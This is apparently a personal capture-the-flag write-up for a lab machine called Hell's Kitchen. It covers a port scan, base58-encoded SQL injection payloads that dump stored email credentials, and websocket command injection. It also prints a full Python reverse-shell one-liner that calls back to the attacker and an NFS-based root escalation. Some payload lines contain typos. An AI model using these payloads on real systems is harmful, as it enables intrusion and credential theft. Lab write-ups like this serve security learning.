## Hell's Kitchen - Writeup

An easy one!

### Port scan

`sudo nmap -sC -sV -p- -oN nmap_initial.txt IP_ADDRESS`
Found ports:
```
PORT     STATE SERVICE
80/tcp   open  http
4346/tcp open  elanlm?
```

### Checked the web pages

- Found web app at 80
- Calls via static/check-rooms.js . Opened .js file in inspector
- API CALL to `/api/rooms-available`
- On `/new-booking` found call to `/api/booking-info?booking_key=<sth-here-via-BK-cookie>`
- This cookie is base58 encoded(checked base64, base60, before)
- Tried some SQL injection payloads on this `booking_key` => `';-- -` => worked with `not found` message
- SQL injection based database enumeration(i was new to Kali-Linux, so found later base58 util already exists)
```shell
# extraction possible via two columns
curl -s http://<IPADDR>/api/booking-info?booking_key=$(echo "booking_id:33443332' UNION SELECT 1,2;-- -" | python3 encode58.py)
# checking sql version
curl -s http://<IPADDR>/api/booking-info?booking_key=$(echo "booking_id:33443332' SELECT 1,sqlit_version() FROM sqlite_schema;-- -" | python3 encode58.py)
# v3.42.0 found

# list sqlite schema gen
curl -s http://<IPADDR>/api/booking-info?booking_key=$(echo "booking_id:33443332' SELECT 1,GROUP_CONCAT(sql, '\n') FROM sqlite_schema;-- -" | python3 encode58.py)
# found email_access tb 

# get contents
curl -s http://<IPADDR>/api/booking-info?booking_key=$(echo "booking_id:33443332' SELECT 1,GROUP_CONCAT(guest_name, ':', email_username, ':', email_password, '\n') FROM sqlite_schema;-- -" | python3 encode58.py)
# got rawtext creds
```
- Checked all e-mails on `:4346`
  - JReyes -> 1st flag

### Websocket connections

got stuck at this point.

- Checked the code at app on `:4346` port. Web-socket conn is being used to grab datetime.
- WS can execute commands on backend's shell via `UTC;whoami;` 
- `python3 --version` returns a version
- Injecting rev-shell payload
  `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IPADDR>",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
- And spinned up my `nc -lvnp 4443`
- Dug around. Found `hotel-jobs.txt` file which had password for user
- `sudo -l` > `/usr/sbin/ufw status` command has root access
- Ran it and found firewall rules. There's 443 port allowed from m/c
- Dug around more. Found `.dad` within `/srv` with password for `sandra`
- `su - sandra`. Got the `user.txt` with flag-2

### Root access

got stuck at this point.

- Kept digging around. Nth...
- Didn't know images can be a part of CTFs. Got `/Pictures/boss.jpg` and exported it out to view on my m/c. `python3` used!
- Found password on image
- `su - jojo`
- Downloaded `linpeas.sh`. `nfs_mount` vuln found.
- Verified via `sudo -l`
```bash
# prepare share
mkdir /tmp/share
sudo chown nobody:nogroup /tmp/share
sudo chmod 777 /tmp/share

# mod whitelisted port and add share dir to /etc/exports
vi /etc/nsf.conf # port=443
sudo bash -c 'echo "/tmp/share 10.0.0.0/8(rw)" >> /etc/exports'

# export shares and restart to commit changes
sudo exportfs -a
sudo systemctl restart nfs-kernel-server

sudo /usr/sbin/mount.nfs -o port=443 <TARGETIPARRD>:/tmp/share /usr/sbin
# mounted our share on /usr/sbin

ls -al /usr/sbin
# root accessible dir
cp /bin/sh /usr/sbin/mount.nfs
ls -al /usr/sbin # /bin/sh exists with diff name

sudo /usr/sbin/mount.nfs
whoami # root -> Found flag-3 at /root/root.txt
```

### base58 py file

```python
import sys

b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

data = sys.stdin.read().strip().encode()
n = int.from_bytes(data, "big")

res = ""
while n > 0:
    n, r = divmod(n, 58)
    res = b58[r] + res

print(res)
```